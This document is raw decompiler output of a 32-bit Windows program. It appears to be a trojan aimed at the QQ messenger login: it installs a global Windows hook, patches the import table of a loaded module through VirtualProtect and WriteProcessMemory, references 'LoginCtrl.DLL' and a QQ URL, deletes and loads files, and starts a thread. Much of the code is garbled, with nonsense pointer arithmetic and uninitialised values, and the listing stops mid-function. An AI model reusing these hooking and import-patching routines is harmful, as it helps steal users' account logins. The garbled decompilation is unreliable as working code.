int32_t function_4075b7(void) {
    // 0x4075b7
    g111--;
    int32_t result; // 0x4075b7
    return result;
}

// Address range: 0x4075bf - 0x4075dd
int32_t function_4075bf(int32_t nCode, int32_t wParam, int32_t lParam) {
    // 0x4075bf
    int32_t hhk; // 0x4075bf
    return CallNextHookEx((int32_t *)hhk, nCode, wParam, lParam);
}

// Address range: 0x4075df - 0x407608
int32_t JmpHookOn(void) {
    int32_t * v1 = SetWindowsHookExA(0, g82, (int32_t *)0x4075bf, 3); // 0x4075ef
    g113 = (int32_t)v1;
    return v1 != NULL;
}

// Address range: 0x40760b - 0x407617
int32_t JmpHookOff(void) {
    // 0x40760b
    return UnhookWindowsHookEx((int32_t *)g113);
}

// Address range: 0x407617 - 0x40763c
int32_t function_407617(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x407622
    __writefsdword(0, (int32_t)&v1);
    g112++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x40763c - 0x407641
int32_t function_40763c(void) {
    // 0x40763c
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x407641 - 0x407643
int32_t function_407641(void) {
    // 0x407641
    int32_t result; // 0x407641
    return result;
}

// Address range: 0x407643 - 0x407645
int32_t function_407643(int32_t a1) {
    // 0x407643
    int32_t result; // 0x407643
    return result;
}

// Address range: 0x407647 - 0x40764f
int32_t function_407647(void) {
    // 0x407647
    g112--;
    int32_t result; // 0x407647
    return result;
}

// Address range: 0x40764f - 0x407655
int32_t * function_40764f(int32_t * Base, char MappedAsImage, int16_t DirectoryEntry, int32_t * Size) {
    // 0x40764f
    return ImageDirectoryEntryToData(Base, MappedAsImage, DirectoryEntry, Size);
}

// Address range: 0x407657 - 0x40767c
int32_t function_407657(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x407662
    __writefsdword(0, (int32_t)&v1);
    g114++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x40767c - 0x407681
int32_t function_40767c(void) {
    // 0x40767c
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x407681 - 0x407683
int32_t function_407681(void) {
    // 0x407681
    int32_t result; // 0x407681
    return result;
}

// Address range: 0x407683 - 0x407685
int32_t function_407683(int32_t a1) {
    // 0x407683
    int32_t result; // 0x407683
    return result;
}

// Address range: 0x407687 - 0x40768f
int32_t function_407687(void) {
    // 0x407687
    g114--;
    int32_t result; // 0x407687
    return result;
}

// Address range: 0x407690 - 0x407773
int32_t function_407690(int32_t a1, int32_t a2, int32_t a3) {
    // 0x407690
    char v1; // 0x407690
    char v2; // 0x407690
    int32_t result; // 0x407690
    int32_t v3; // 0x407690
    int32_t v4; // 0x407690
    int32_t * v5; // 0x407690
    int32_t v6; // 0x407690
    uint32_t v7; // 0x407690
    int32_t v8; // 0x407690
    bool v9; // 0x407690
    bool v10; // 0x407690
    if (v9 || v10) {
        char * v11 = (char *)(v6 + 42); // 0x4076d2
        *v11 = *v11 + (char)v6;
        char * v12 = (char *)(v6 + 119); // 0x4076d6
        *v12 = *v12 + (char)(v7 / 256);
        char * v13 = (char *)(v3 + 2); // 0x4076da
        *v13 = *v13 + (char)v8;
        int16_t v14 = v7; // 0x4076de
        int32_t v15; // 0x407690
        __asm_outsd(v14, v15);
        __asm_outsd(v14, v15);
        int32_t v16 = 73 * *(int32_t *)(v8 + 80); // 0x4076e0
        v3 = v16;
        int32_t v17 = v4; // bp-24, 0x4076ed
        char v18 = v7;
        v2 = v18;
        v1 = 0;
        result = v16;
        v5 = &v17;
        if (v18 == 0) {
            goto lab_0x4076fa;
        } else {
            goto lab_0x4076f2;
        }
    } else {
        int32_t v19 = v3;
        *(char *)v19 = *(char *)&v3 + (char)v19;
        int32_t v20 = v3;
        *(char *)v20 = *(char *)&v3 + (char)v20;
        int32_t v21 = v3;
        *(char *)v21 = *(char *)&v3 + (char)v21;
        int32_t v22 = v3;
        *(char *)v22 = *(char *)&v3 + (char)v22;
        int32_t v23 = v3;
        *(char *)v23 = *(char *)&v3 + (char)v23;
        int32_t v24 = v3;
        *(char *)v24 = *(char *)&v3 + (char)v24;
        int32_t v25 = v3;
        *(char *)v25 = *(char *)&v3 + (char)v25;
        int32_t v26 = v3;
        *(char *)v26 = *(char *)&v3 + (char)v26;
        int32_t v27 = v3;
        *(char *)v27 = *(char *)&v3 + (char)v27;
        int32_t v28 = v3;
        *(char *)v28 = *(char *)&v3 + (char)v28;
        int32_t v29 = v3;
        *(char *)v29 = *(char *)&v3 + (char)v29;
        int32_t v30 = v3;
        *(char *)v30 = *(char *)&v3 + (char)v30;
        int32_t v31 = v3;
        *(char *)v31 = *(char *)&v3 + (char)v31;
        int32_t v32 = v3;
        *(char *)v32 = *(char *)&v3 + (char)v32;
        unsigned char v33 = (char)v6; // 0x4076ae
        unsigned char v34 = 2 * v33; // 0x4076ae
        if (v34 >= v33 && v34 != 0) {
            int32_t v35 = v6 & -256 | (int32_t)v34; // 0x4076ae
            char * v36 = (char *)(2 * v3); // 0x4076b2
            *v36 = *v36 + v34;
            unsigned char v37 = *(char *)&v3; // 0x4076b5
            unsigned char v38 = v37 + (char)v3; // 0x4076b5
            *(char *)v3 = v38;
            char * v39 = (char *)v35; // 0x4076b8
            *v39 = *v39 + v34 + (char)(v38 < v37);
            char * v40 = (char *)(v4 + 43); // 0x4076be
            *v40 = *v40 + (v34 | 1);
            char * v41 = (char *)(v3 + 43); // 0x4076c2
            char v42 = v8; // 0x4076c2
            *v41 = *v41 + v42;
            char * v43 = (char *)(v4 + 43); // 0x4076c6
            *v43 = *v43 + v42;
            *v41 = v34 + 4 + *v41;
            *(char *)v4 = *(char *)&v4 + (char)(v3 / 256);
            return v35 + 5;
        }
        // 0x407692
        v2 = v7;
        goto lab_0x4076f2;
    }
  lab_0x4076fa:;
    int32_t v44 = (int32_t)v5;
    v4 = a1;
    int32_t * moduleHandle = GetModuleHandleA((char *)(v7 & 255)); // 0x407708
    int32_t * v45 = (int32_t *)(result + 8); // 0x40770d
    *v45 = (int32_t)moduleHandle;
    int32_t v46 = v44 - 4; // 0x407714
    if (moduleHandle != NULL) {
        // 0x407716
        *(int32_t *)(result + 12) = v4;
        int32_t * v47 = (int32_t *)(result + 16); // 0x40771c
        *v47 = a2;
        int32_t * v48 = (int32_t *)(result + 20); // 0x407722
        *v48 = a3;
        *(int32_t *)(v44 - 8) = *v47;
        *(int32_t *)(v44 - 12) = v4;
        int32_t * moduleHandle2 = GetModuleHandleA((char *)&g118); // 0x40772a
        int32_t v49 = v44 - 16; // 0x40772f
        *(int32_t *)v49 = (int32_t)moduleHandle2;
        int32_t (*func)() = GetProcAddress(&g118, (char *)&g118); // 0x407730
        *(int32_t *)(result + 24) = (int32_t)func;
        v46 = v49;
        if (func != NULL) {
            // 0x40773e
            *(int32_t *)(v44 - 20) = *v48;
            int32_t v50 = v44 - 24; // 0x407745
            *(int32_t *)v50 = *v45;
            function_4077bb((int32_t)&g118);
            v46 = v50;
        }
    }
    if (v1 != 0) {
        // 0x40775a
        function_402bcf();
        __writefsdword(0, *(int32_t *)v46);
    }
    // 0x407769
    return result;
  lab_0x4076f2:;
    int32_t v51 = function_402b77(); // 0x4076f5
    v3 = v51;
    v1 = v2;
    result = v51;
    int32_t v52; // bp-40, 0x407690
    v5 = &v52;
    goto lab_0x4076fa;
}

// Address range: 0x407773 - 0x4077bb
int32_t function_407773(void) {
    int32_t v1 = function_402bdf(); // 0x407775
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x40777e
    int32_t v3 = v1; // 0x407782
    if (*v2 != 0) {
        int32_t * v4 = (int32_t *)(v1 + 24); // 0x407784
        v3 = v1;
        if (*v4 != 0) {
            int32_t moduleHandle = (int32_t)GetModuleHandleA((char *)*(int32_t *)(v1 + 4)); // 0x40778e
            v3 = moduleHandle;
            if (*v2 == moduleHandle) {
                // 0x407798
                v3 = function_4077bb(*v4);
            }
        }
    }
    int32_t result = v3; // 0x4077af
    int32_t v5; // 0x407773
    if ((char)v5 >= 1) {
        // 0x4077b1
        result = function_402bc7();
    }
    // 0x4077b8
    return result;
}

// Address range: 0x4077bb - 0x407871
int32_t function_4077bb(int32_t a1) {
    // 0x4077bb
    int32_t result; // 0x4077bb
    if (a1 == 0 || a1 <= -1) {
        // 0x407868
        return result;
    }
    int32_t v1 = a1; // bp-52, 0x4077ec
    int32_t v2; // 0x4077bb
    int32_t v3; // 0x4077bb
    int32_t v4; // 0x4077bb
    int32_t * v5 = ImageDirectoryEntryToData((int32_t *)v2, (char)v3, (int16_t)v4, &g118); // 0x4077ed
    int32_t result2 = (int32_t)v5; // 0x4077ed
    if (v5 == NULL) {
        // 0x407868
        return result2;
    }
    int32_t result3 = *(int32_t *)(result2 + 12); // 0x407861
    if (result3 == 0) {
        // 0x407868
        return result3;
    }
    // 0x4077fa
    int32_t v6; // bp-24, 0x4077bb
    int32_t v7 = &v6;
    int32_t v8 = result3; // 0x407861
    int32_t v9 = result2; // 0x4077bb
    int32_t v10 = &v1; // 0x4077bb
    while (true) {
        int32_t v11 = v10;
        int32_t v12 = v9;
        *(int32_t *)(v11 - 4) = 0x1000000 * v3 / 0x1000000;
        int32_t v13 = v11 - 8; // 0x407803
        *(int32_t *)v13 = v8 + a1;
        int32_t v14 = lstrcmpiA((char *)&g118, (char *)&g118); // 0x407804
        v10 = v13;
        if (v14 == 0) {
            int32_t v15 = *(int32_t *)(v12 + 16) + a1; // 0x407810
            int32_t v16 = *(int32_t *)v15; // 0x407858
            int32_t v17 = v16; // 0x40785c
            int32_t v18 = v15; // 0x40785c
            v10 = v13;
            if (v16 != 0) {
                int32_t v19 = v18;
                while (v17 != 0x10000 * v4 / 0x10000) {
                    int32_t v20 = v19 + 4; // 0x407855
                    int32_t v21 = *(int32_t *)v20; // 0x407858
                    v17 = v21;
                    v18 = v20;
                    v10 = v13;
                    if (v21 == 0) {
                        goto lab_0x40785e;
                    }
                    v19 = v18;
                }
                // 0x40781a
                int32_t v22; // bp-20, 0x4077bb
                *(int32_t *)(v11 - 12) = (int32_t)&v22;
                *(int32_t *)(v11 - 16) = 128;
                *(int32_t *)(v11 - 20) = 4;
                *(int32_t *)(v11 - 24) = v19;
                VirtualProtect(&g118, (int32_t)&g118, (int32_t)&g118, &g118);
                *(int32_t *)(v11 - 28) = v7;
                *(int32_t *)(v11 - 32) = 4;
                int32_t v23; // 0x4077bb
                *(int32_t *)(v11 - 36) = (int32_t)&v23;
                *(int32_t *)(v11 - 40) = v19;
                *(int32_t *)(v11 - 44) = (int32_t)GetCurrentProcess();
                WriteProcessMemory(&g118, &g118, &g118, (int32_t)&g118, &g118);
                *(int32_t *)(v11 - 48) = v7;
                *(int32_t *)(v11 - 52) = v22;
                *(int32_t *)(v11 - 56) = 4;
                int32_t v24 = v11 - 60; // 0x40784d
                *(int32_t *)v24 = v19;
                VirtualProtect(&g118, (int32_t)&g118, (int32_t)&g118, &g118);
                v10 = v24;
            }
        }
      lab_0x40785e:
        // 0x40785e
        v8 = *(int32_t *)(v12 + 32);
        v9 = v12 + 20;
        result = v8;
        if (v8 == 0) {
            // break -> 0x407868
            break;
        }
    }
    // 0x407868
    return result;
}

// Address range: 0x407873 - 0x407877
int32_t function_407873(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x407873
    int32_t v1; // 0x407873
    return *(int32_t *)(v1 + 24);
}

// Address range: 0x407877 - 0x40789c
int32_t function_407877(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x407882
    __writefsdword(0, (int32_t)&v1);
    g115++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x40789c - 0x4078a1
int32_t function_40789c(void) {
    // 0x40789c
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4078a1 - 0x4078a3
int32_t function_4078a1(void) {
    // 0x4078a1
    int32_t result; // 0x4078a1
    return result;
}

// Address range: 0x4078a3 - 0x4078a5
int32_t function_4078a3(int32_t a1) {
    // 0x4078a3
    int32_t result; // 0x4078a3
    return result;
}

// Address range: 0x4078a7 - 0x4078af
int32_t function_4078a7(void) {
    // 0x4078a7
    g115--;
    int32_t result; // 0x4078a7
    return result;
}

// Address range: 0x4078af - 0x4078fb
int32_t function_4078af(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x4078af
    int32_t v1; // 0x4078af
    int32_t v2; // 0x4078af
    int32_t v3; // 0x4078af
    return function_407873(v2, v3, v1, a1, a2);
}

// Address range: 0x4078fb - 0x40792a
int32_t function_4078fb(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x4078fb
    int32_t v1; // 0x4078fb
    return function_407873(v1, a1, a2, a3 != 2975 ? a3 : 2974, a4);
}

// Address range: 0x40792b - 0x4079c3
int32_t function_40792b(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    int32_t v1 = __readfsdword(0); // bp-32, 0x407942
    __writefsdword(0, (int32_t)&v1);
    function_4034fb();
    int32_t v2 = function_403893() < 1 ? a4 : (int32_t)"http://jump.qq.com/clienturl_156";
    function_4034fb();
    int32_t v3 = function_403893() < 1 ? a3 : (int32_t)"http://jump.qq.com/clienturl_156";
    function_407873(a1, a2, v3, v2, a5);
    __writefsdword(0, a6);
    return function_40341b();
}

// Address range: 0x4079c3 - 0x4079c8
int32_t function_4079c3(void) {
    // 0x4079c3
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4079c8 - 0x4079ca
int32_t function_4079c8(void) {
    // 0x4079c8
    int32_t result; // 0x4079c8
    return result;
}

// Address range: 0x4079ca - 0x4079d4
int32_t function_4079ca(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x4079ca
    int32_t result; // 0x4079ca
    return result;
}

// Address range: 0x4079da - 0x4079dc
int32_t function_4079da(void) {
    // 0x4079da
    int32_t result; // 0x4079da
    return result;
}

// Address range: 0x4079dc - 0x407b51
int32_t function_4079dc(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11, int32_t a12, int32_t a13, int32_t a14, int32_t a15) {
    int32_t v1 = a15;
    int32_t v2; // 0x4079dc
    *(char *)v2 = 2 * (char)v2;
    int32_t result; // 0x4079dc
    char * v3 = (char *)(result + 116); // 0x4079de
    uint32_t v4; // 0x4079dc
    uint32_t v5 = v4 / 256; // 0x4079de
    unsigned char v6 = (char)v5; // 0x4079de
    char v7 = *v3 + v6; // 0x4079de
    *v3 = v7;
    if (v7 == 0) {
        // 0x407a6b
        return result;
    }
    // 0x4079e3
    int32_t v8; // 0x4079dc
    unsigned char v9 = *(char *)&v8; // 0x4079e3
    unsigned char v10 = (char)result; // 0x4079e5
    bool v11 = v9 > v6 | v10 > 153;
    char v12; // 0x4079dc
    int32_t result2; // 0x4079dc
    if ((v6 & 15) - (v9 & 15) > 15 || (v10 & 14) > 9) {
        char v13 = (v11 ? -102 : -6) + v10; // 0x4079e5
        result2 = result & -256 | (int32_t)v13;
        v12 = v13;
    } else {
        char v14 = v11 ? v10 - 96 : v10; // 0x4079e5
        result2 = result & -256 | (int32_t)v14;
        v12 = v14;
    }
    uint32_t v15; // 0x4079dc
    int16_t v16 = v15; // 0x4079e8
    *(int32_t *)v8 = __asm_insd(v16);
    if (((v6 - v9 ^ v6) & (v9 ^ v6)) >= 0) {
        char * v17 = (char *)(v15 + 0x768fa101); // 0x407a5f
        *v17 = *v17 + (char)(v15 / 256);
        return result2 + 2;
    }
    // 0x407a19
    int32_t v18; // 0x4079dc
    __asm_outsb(v16, __readgsbyte(v18));
    if (v12 == 0) {
        int32_t v19 = result2;
        // 0x407a6b
        return (v19 + (v11 ? 130 : 129) & 255 | v19 & -256) + 1;
    }
    if (v11) {
        int32_t v20 = result2;
        return v20 + v5 & 255 | v20 & -256;
    }
    // 0x407a1f
    v8 = 117;
    *(int32_t *)54 = *(int32_t *)54 ^ v18;
    char * v21 = (char *)(result2 - 105); // 0x407a26
    char v22 = *v21 + v6; // 0x407a26
    char v23 = llvm_ctpop_i8(v22); // 0x407a26
    *v21 = v22;
    if ((v23 & 1) == 0) {
        // 0x407a6b
        return result2;
    }
    char * v24 = (char *)(result2 - 93); // 0x407a2b
    char v25 = *v24 + v6; // 0x407a2b
    char v26 = llvm_ctpop_i8(v25); // 0x407a2b
    *v24 = v25;
    if ((v26 & 1) != 0) {
        char * v27 = (char *)(result2 - 81); // 0x407a30
        char v28 = *v27 + v6; // 0x407a30
        *v27 = v28;
        if (v28 < 0) {
            // 0x407a75
            return result2;
        }
        char * v29 = (char *)(v4 + (int32_t)"LoginCtrl.DLL"); // 0x407a35
        uint32_t v30; // 0x4079dc
        *v29 = *v29 + (char)(v30 / 256);
        g31 = (char *)&g7;
        *(int32_t *)((int32_t)&v1 - 4) = (int32_t)"user32.dll";
        return &g7;
    }
    char * v31 = (char *)(result2 - 41); // 0x407a70
    char v32 = *v31 + v6; // 0x407a70
    char v33 = llvm_ctpop_i8(v32); // 0x407a70
    *v31 = v32;
    if ((v33 & 1) != 0) {
        // 0x407a75
        return result2;
    }
    if (v32 == 0) {
        int32_t v34 = __readfsdword(result2); // bp-8, 0x407b2e
        __writefsdword(result2, (int32_t)&v34);
        return result2;
    }
    // 0x407ab7
    *(char *)v8 = __asm_insb(v16);
    char * v35 = (char *)result2; // 0x407abc
    *v35 = *v35 + (char)result2;
    return result2;
}

// Address range: 0x407b53 - 0x407b5b
int32_t function_407b53(void) {
    // 0x407b53
    g116--;
    int32_t result; // 0x407b53
    return result;
}

// Address range: 0x407b5b - 0x407b65
int32_t function_407b5b(void) {
    // 0x407b5b
    int32_t result; // 0x407b5b
    return result;
}

// Address range: 0x407b67 - 0x407b86
int32_t function_407b67(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x407b72
    __writefsdword(0, (int32_t)&v1);
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x407b86 - 0x407b8b
int32_t function_407b86(void) {
    // 0x407b86
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x407b8b - 0x407b8d
int32_t function_407b8b(void) {
    // 0x407b8b
    int32_t result; // 0x407b8b
    return result;
}

// Address range: 0x407b8d - 0x407b8f
int32_t function_407b8d(int32_t a1) {
    // 0x407b8d
    int32_t result; // 0x407b8d
    return result;
}

// Address range: 0x407b8f - 0x407c55
int32_t function_407b8f(void) {
    // 0x407b8f
    int32_t v1; // 0x407b8f
    char v2 = v1;
    *(char *)v1 = 2 * v2;
    int32_t v3; // 0x407b8f
    char * v4 = (char *)(v3 - 0x44ffbf85); // 0x407b92
    uint32_t v5; // 0x407b8f
    char v6 = v5; // 0x407b92
    *v4 = *v4 + v6;
    int32_t v7; // 0x407b8f
    int32_t v8 = v7 + 1; // 0x407b98
    char * v9 = (char *)(v7 + 0x23004044); // 0x407b9a
    int32_t v10; // 0x407b8f
    *v9 = *v9 + (char)v10;
    uint32_t v11 = v10 + 1; // 0x407ba0
    int32_t v12 = 256 * v11;
    int32_t v13 = v5 / 256 + v8; // 0x407ba6
    int32_t v14 = ((v13 & 255 | v8 & -0x10000 | v12 + v8 & 0xff00) + 1 & -256 | v13 + 6 + v1 & 255) + 1; // 0x407bac
    int32_t v15 = v14 + v11; // 0x407bae
    int32_t v16 = v15 & 255 | v14 & -256; // 0x407bae
    char * v17 = (char *)(v16 + 0x53004046); // 0x407bb2
    char v18 = v15; // 0x407bb2
    *v17 = *v17 + v18;
    char * v19 = (char *)(v3 - 0xffbfb7); // 0x407bc2
    *v19 = *v19 + v6;
    char * v20 = (char *)(v3 + 0x5f00404c); // 0x407bce
    char v21 = v11; // 0x407bce
    *v20 = *v20 + v21;
    char * v22 = (char *)(v3 + 78); // 0x407bd6
    *v22 = *v22 + v18;
    char * v23 = (char *)(v3 + 4); // 0x407bda
    char v24 = v11 / 256; // 0x407bda
    *v23 = *v23 + v24;
    char * v25 = (char *)(v3 + 0x6700404e); // 0x407bde
    *v25 = v6 - 1 + *v25;
    char * v26 = (char *)(v3 + 0xf00404e); // 0x407bea
    *v26 = *v26 + (char)((v1 + 16) / 256);
    int32_t v27 = (v16 & -0xff01 | v10 + 1793 + v12 + 256 * (v1 + v5) + (v14 & 0xff00) & 0xff00) - 1; // 0x407bf0
    uint32_t v28 = v5 - 4; // 0x407bf4
    char * v29 = (char *)(v3 + 79); // 0x407bf6
    *v29 = v2 + 18 + *v29;
    char v30 = v28; // 0x407bfa
    *v23 = *v23 + v30;
    char * v31 = (char *)(v3 + 0x5700404f); // 0x407bfe
    *v31 = v2 + 20 + *v31;
    uint32_t v32 = (257 * v27 & 0xff00 | v27 & -0xff01) - 2; // 0x407c04
    char * v33 = (char *)(v3 - 0x78ffbfaf); // 0x407c06
    char v34 = v28 / 256; // 0x407c06
    *v33 = *v33 + v34;
    *v23 = (char)(v32 / 256) + v21 + *v23;
    int32_t v35 = v32 + v12 + (v32 & 0xff00) & 0xff00 | v32 & -0xff01; // 0x407c1a
    char * v36 = (char *)v35; // 0x407c1c
    char * v37 = (char *)(v35 + 0x6300405b); // 0x407c22
    *v37 = *v37 + v24;
    *v36 = *v36 + v34;
    char * v38 = (char *)(v3 + 98); // 0x407c2e
    *v38 = v2 + 29 + *v38;
    *v23 = v2 + 30 + *v23;
    char * v39 = (char *)(v3 + 100); // 0x407c36
    *v39 = v2 + 31 + *v39;
    *v23 = *v23 + v30;
    char * v40 = (char *)(v3 + 101); // 0x407c3e
    char v41 = (v1 + 33) / 256; // 0x407c3e
    *v40 = *v40 + v41;
    *v23 = *v23 + v34;
    char * v42 = (char *)(v35 + 105); // 0x407c46
    *v42 = *v42 + v41;
    *v23 = *v23 + (char)((v1 + 34) / 256);
    int16_t v43; // 0x407b8f
    return function_407cc2(v43);
}

// Address range: 0x407c55 - 0x407cc1
int32_t function_407c55(void) {
    // 0x407c55
    int32_t v1; // 0x407c55
    char * v2 = (char *)(v1 - 0x78ffbf8b); // 0x407c56
    uint32_t v3; // 0x407c55
    char v4 = v3 / 256; // 0x407c56
    char v5 = *v2 + v4; // 0x407c56
    *v2 = v5;
    int32_t v6; // 0x407cae
    uint32_t v7; // 0x407c55
    if (v5 != 0) {
        // 0x407cae
        v6 = -0x764bba76;
        return v6 + v7 / 256 & 255 | v6 & -256;
    }
    // 0x407c5e
    int32_t v8; // 0x407c55
    char * v9 = (char *)(v8 + 118); // 0x407c5e
    int32_t v10; // 0x407c55
    *v9 = (char)v10 + 1 + *v9;
    int32_t v11 = v10 + 2; // 0x407c61
    unsigned char v12 = *(char *)&v8; // 0x407c62
    char v13 = v3; // 0x407c62
    unsigned char v14 = v12 + v13; // 0x407c62
    *(char *)v8 = v14;
    if (v14 < v12 || v14 == 0) {
        // 0x407cae
        v6 = v11 + 1;
        return v6 + v7 / 256 & 255 | v6 & -256;
    }
    char * v15 = (char *)(v8 + 0x57004076); // 0x407c66
    unsigned char v16 = *v15; // 0x407c66
    unsigned char v17 = v16 + (char)v11; // 0x407c66
    *v15 = v17;
    if (v17 < v16 || v17 == 0) {
        // 0x407cae
        v6 = v11 + 1;
        return v6 + v7 / 256 & 255 | v6 & -256;
    }
    char * v18 = (char *)(v8 + 0x77004078); // 0x407c6e
    char v19 = *v18 + (char)(v11 / 256); // 0x407c6e
    *v18 = v19;
    int32_t v20; // 0x407c55
    if (v19 < 0) {
        // 0x407cb6
        *(char *)v20 = *(char *)&v20 + v4;
        int32_t v21; // 0x407c55
        return v21 + 1;
    }
    char * v22 = (char *)(v20 + 123); // 0x407c76
    *v22 = *v22 + v13;
    uint32_t result = v10 + 3; // 0x407c79
    unsigned char v23 = *(char *)&v20; // 0x407c7a
    char v24 = result / 256; // 0x407c7a
    unsigned char v25 = v23 + v24; // 0x407c7a
    char v26 = llvm_ctpop_i8(v25); // 0x407c7a
    *(char *)v20 = v25;
    if ((v26 & 1) != 0) {
        char * v27 = (char *)(v8 + 64); // 0x407cbe
        *v27 = *v27 + (char)(v25 < v23) - (char)(v20 / 256);
        return result;
    }
    char * v28 = (char *)result; // 0x407c7e
    *v28 = *v28 + 2 * (char)result;
    char * v29 = (char *)(v8 + 123); // 0x407c82
    *v29 = *v29 + v24;
    int32_t v30; // 0x407c55
    char * v31 = (char *)(v30 - 117); // 0x407c86
    *v31 = *v31 + v13;
    __asm_in((int16_t)v3);
    *(int32_t *)(v30 - 96) = 0;
    *(int32_t *)(v30 - 92) = 0;
    *(int32_t *)(v30 - 88) = 0;
    *(int32_t *)(v30 - 84) = 0;
    return 0;
}

// Address range: 0x407cc2 - 0x407f18
int32_t function_407cc2(int16_t a1) {
    // 0x407cc2
    int32_t v1; // 0x407cc2
    int32_t v2 = __readfsdword(v1); // bp-4, 0x407cc2
    __writefsdword(v1, (int32_t)&v2);
    int32_t v3 = 0; // bp-16, 0x407cce
    int32_t lpFilename; // 0x407cc2
    *(char *)(GetModuleFileNameA((int32_t *)260, (char *)lpFilename, 0) + lpFilename) = 0;
    function_403537();
    function_407113();
    function_40344b();
    int32_t v4; // 0x407cc2
    int32_t v5; // 0x407cc2
    if ((char)function_40718b() == 0) {
        int32_t v6 = &v3; // 0x407cce
        function_406177();
        v5 = v6;
        if ((char)function_40718b() == 0) {
            goto lab_0x407efd;
        } else {
            // 0x407db0
            *(int32_t *)g34 = -1;
            v4 = v6;
            goto lab_0x407dbb;
        }
    } else {
        // 0x407d13
        *(int32_t *)g33 = -1;
        function_403537();
        function_407153();
        function_40344b();
        function_40359b();
        DeleteFileA((char *)function_40374f());
        function_40359b();
        char * lpLibFileName = (char *)function_40374f(); // 0x407d81
        char * v7 = lpLibFileName; // bp-24, 0x407d81
        g32 = (int32_t)LoadLibraryA(lpLibFileName);
        v4 = (int32_t)&v7;
        goto lab_0x407dbb;
    }
  lab_0x407efd:
    // 0x407efd
    __writefsdword(0, *(int32_t *)v5);
    *(int32_t *)(v5 + 8) = 0x407f1f;
    return function_40341b();
  lab_0x407dbb:
    // 0x407dbb
    *(int32_t *)(v4 - 4) = 260;
    int32_t v8 = v4 - 12; // 0x407dc6
    *(int32_t *)v8 = (int32_t)g82;
    int32_t nameSize = GetModuleFileNameA(&g118, (char *)&g118, (int32_t)&g118); // 0x407dc7
    *(char *)(nameSize + lpFilename) = 0;
    function_403537();
    function_407153();
    function_40344b();
    function_40359b();
    int32_t v9; // 0x407cc2
    if (g34 == 0) {
        // 0x407e54
        v5 = v8;
        if (g33 == 0) {
            goto lab_0x407efd;
        } else {
            // 0x407e62
            if (g37 >= 1) {
                // 0x407e7b
                function_404dbf();
                function_40369b();
                *(int32_t *)g38 = -1;
            }
            // 0x407eae
            *(int32_t *)(v4 - 16) = 3;
            *(int32_t *)(v4 - 20) = 0x3ec1;
            int32_t v10 = v4 - 24; // 0x407eba
            *(int32_t *)v10 = g32;
            int32_t * v11 = FindResourceA(&g118, (char *)&g118, (char *)&g118); // 0x407ebb
            v9 = v10;
            if (v11 != NULL) {
                goto lab_0x407eee;
            } else {
                // 0x407ec4
                *(int32_t *)(v4 - 28) = 14;
                *(int32_t *)(v4 - 32) = 0x3ec1;
                int32_t v12 = v4 - 36; // 0x407ed0
                *(int32_t *)v12 = g32;
                int32_t * v13 = FindResourceA(&g118, (char *)&g118, (char *)&g118); // 0x407ed1
                v9 = v12;
                if (v13 != NULL) {
                    goto lab_0x407eee;
                } else {
                    // 0x407eda
                    *(int32_t *)(v4 - 40) = 0x3ec1;
                    int32_t v14 = v4 - 44; // 0x407ee4
                    *(int32_t *)v14 = g32;
                    int32_t * iconHandle = LoadIconA(&g118, (char *)&g118); // 0x407ee5
                    v9 = v14;
                    v5 = v14;
                    if (iconHandle == NULL) {
                        goto lab_0x407efd;
                    } else {
                        goto lab_0x407eee;
                    }
                }
            }
        }
    } else {
        // 0x407e21
        *(int32_t *)(v4 - 16) = (int32_t)"xr, wo xiang ni";
        int32_t v15 = v4 - 20; // 0x407e26
        *(int32_t *)v15 = (int32_t)"ListBox";
        int32_t * v16 = FindWindowA((char *)&g118, (char *)&g118); // 0x407e2b
        v5 = v15;
        if (v16 == NULL) {
            // 0x407e38
            *(int32_t *)(v4 - 24) = (int32_t)&g117;
            *(int32_t *)(v4 - 28) = 0;
            *(int32_t *)(v4 - 32) = 66;
            *(int32_t *)(v4 - 36) = 0x4067f3;
            *(int32_t *)(v4 - 40) = 0;
            int32_t v17 = v4 - 44; // 0x407e48
            *(int32_t *)v17 = 0;
            CreateThread((struct _SECURITY_ATTRIBUTES *)&g118, (int32_t)&g118, (int32_t (*)(int32_t *))&g118, &g118, (int32_t)&g118, &g118);
            v5 = v17;
        }
        goto lab_0x407efd;
    }
  lab_0x407eee:
    // 0x407eee
    g83 = 0x407b5b;
    v5 = v9;
    goto lab_0x407efd;
}

// Address range: 0x407f18 - 0x407f1d
int32_t function_407f18(void) {
    // 0x407f18
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x407f1d - 0x407f1f
int32_t function_407f1d(void) {
    // 0x407f1d
    int32_t result; // 0x407f1d
    return result;
}

// Address range: 0x40e004 - 0x40e010
int32_t function_40e004(int32_t Offset) {
    // 0x40e004
    __readfsdword(Offset);
    return 24;
}

// Address range: 0x40e010 - 0x40e020
int32_t function_40e010(int32_t a1) {
    // 0x40e010
    int32_t v1; // 0x40e010
    return 4 * (int32_t)*(char *)(v1 + 1) + 111;
}

// Address range: 0x40e02f - 0x40e128
int32_t entry_point(void) {
    // 0x40e02f
    int32_t v1; // 0x40e02f
    __readfsdword(v1);
    return function_40e010((int32_t)&g118);
}

// Address range: 0x40e128 - 0x40e199
int32_t function_40e128(int32_t a1) {
    // 0x40e128
